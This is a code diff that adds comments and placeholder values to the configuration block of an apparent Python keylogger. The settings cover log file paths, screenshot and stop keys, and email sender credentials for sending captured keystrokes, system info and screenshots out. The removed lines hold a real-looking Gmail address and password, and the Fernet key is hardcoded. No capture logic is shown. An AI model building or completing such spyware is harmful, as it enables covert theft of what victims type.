@@ -24,27 +24,27 @@ class Keylogger():
         self.FernetKey = "3F5_MIT38NjguwKLSztfCdeoOYPOMi3NKK0rEGCrlSg="
 
         #Log settings
-        self.Path = r"C:\Users\Public\Documents\Log"
-        self.LogFile = "log.txt"
-        self.SystemInfo = "systeminfo.txt"
-        self.ScreenFile = "screenlog"
+        self.Path = r"C:\Users\Public\Documents\Log" # Path to locally stored log files
+        self.LogFile = "log.txt"                     # Keylogs filename
+        self.SystemInfo = "systeminfo.txt"           # SystemInfo filename
+        self.ScreenFile = "screenlog"                # Screenshot filename
 
         #Email settings
-        self.Email = "test8010181010@gmail.com"
-        self.Password = "keyloggertest"
-        self.ToEmail = self.Email
-        self.Subject = "subject example"
-        self.Body = "body example"
+        self.Email = "example@gmail.com"      # Your Email (Sender)
+        self.Password = "pass"              # Your Password (Sender)
+        self.ToEmail = self.Email                    # Email (Recipient)
+        self.Subject = "subject example"             # Email Subject
+        self.Body = "body example"                   # Email Body
 
         #Other settings
-        self.CharForLine = 30
-        self.ScreenKey = Key.enter
-        self.CloseKey = Key.alt_gr
+        self.CharForLine = 30                        # Number of keys pressed in a log line
+        self.ScreenKey = Key.enter                   # Screenshot key
+        self.CloseKey = Key.alt_gr                   # Stop script key
 
-        #Other Variables 
-        self.Keys = []
-        self.KeysCount = 0
-        self.ScreenCount = 1
+        #Other Variables                             
+        self.Keys = []                               # DO NOT EDIT THIS
+        self.KeysCount = 0                           # DO NOT EDIT THIS
+        self.ScreenCount = 1                         # DO NOT EDIT THIS
 
 
     #SETUP FUNCTIONS
